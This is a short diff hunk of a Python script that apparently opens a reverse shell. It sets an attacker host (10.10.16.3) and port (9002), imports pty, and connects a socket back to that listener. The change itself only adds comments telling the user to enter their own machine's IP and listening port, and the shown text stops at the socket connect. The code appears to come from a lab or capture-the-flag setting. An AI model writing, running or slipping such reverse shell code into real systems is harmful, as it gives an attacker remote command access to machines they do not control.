@@ -4,8 +4,8 @@ import os
 import pty
 import sys
 
-lhost="10.10.16.3"
-lport=9002
+lhost="10.10.16.3" # Your machine's IP address
+lport=9002 # Port to listen on your machine
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn = sock.connect(("10.10.16.3", 9002))
